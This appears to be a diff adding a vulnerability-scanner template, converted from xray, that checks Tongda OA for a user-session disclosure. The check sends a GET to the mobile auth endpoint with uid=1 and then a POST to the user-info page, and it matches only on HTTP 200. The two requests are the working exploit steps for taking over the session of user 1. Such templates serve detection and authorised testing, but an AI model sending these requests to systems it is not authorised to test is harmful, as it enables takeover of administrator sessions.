@@ -1,0 +1,31 @@
+id: poc-yaml-tongda-user-session-disclosure
+
+info:
+  name: poc-yaml-tongda-user-session-disclosure
+  author: kzaopa(https://github.com/kzaopa)
+  severity: high
+  tags: xray-converted,exposure,ct-159108
+  reference:
+    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
+
+http:
+  - raw:
+      - |
+        GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /general/userinfo.php?UID=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
